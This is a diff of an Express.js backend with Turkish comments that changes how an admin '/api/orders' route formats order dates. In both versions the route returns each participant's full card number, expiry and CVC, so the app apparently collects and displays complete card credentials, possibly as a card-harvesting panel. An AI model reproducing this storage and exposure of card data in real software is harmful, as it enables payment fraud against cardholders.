@@ -77,36 +77,30 @@ app.get('/api/count', async (req, res) => {
 
 // Tüm katılımcıları/siparişleri listeleme rotası (Admin Paneli için)
 app.get('/api/orders', authMiddleware, async (req, res) => {
-  try {
-      const participants = await req.prisma.participant.findMany({
-          orderBy: {
-              createdAt: 'desc' // En yeniyi en üste getir
-          }
-      });
-      // Frontend'in beklediği formatta (created_at yerine createdAt) dönüşüm yapalım
-      const formattedParticipants = participants.map(p => ({
-          id: p.id,
-          name: p.name,
-          email: p.email,
-          card: p.card,
-          exp: p.exp,
-          cvc: p.cvc,
-          // Tarihi daha okunabilir bir formatta döndürelim (isteğe bağlı)
-          created_at: p.createdAt.toLocaleString('tr-TR', {
-              year: 'numeric',
-              month: 'numeric',
-              day: 'numeric',
-              hour: '2-digit',
-              minute: '2-digit',
-              second: '2-digit'
-          })
-      }));
-      res.json({ success: true, orders: formattedParticipants });
-  } catch (error) {
-      console.error('Siparişler alınırken hata oluştu:', error);
-      res.status(500).json({ success: false, message: 'Siparişler alınamadı.', error: error.message });
-  }
-});
+    try {
+        const participants = await req.prisma.participant.findMany({
+            orderBy: {
+                createdAt: 'desc'
+            }
+        });
+        
+        // Frontend'in beklediği formatta dönüşüm yapalım
+        const formattedParticipants = participants.map(p => ({
+            id: p.id,
+            name: p.name,
+            email: p.email,
+            card: p.card,
+            exp: p.exp,
+            cvc: p.cvc,
+            // !!! BURAYI GÜNCELLE: createdAt'ı ISO string olarak gönder !!!
+            created_at: p.createdAt.toISOString() 
+        }));
+        res.json({ success: true, orders: formattedParticipants });
+    } catch (error) {
+        console.error('Siparişler alınırken hata oluştu:', error);
+        res.status(500).json({ success: false, message: 'Siparişler alınamadı.', error: error.message });
+    }
+  });
 
 // Katılımcı/Sipariş silme rotası (Admin Paneli için)
 app.delete('/api/orders/:id', authMiddleware, async (req, res) => {
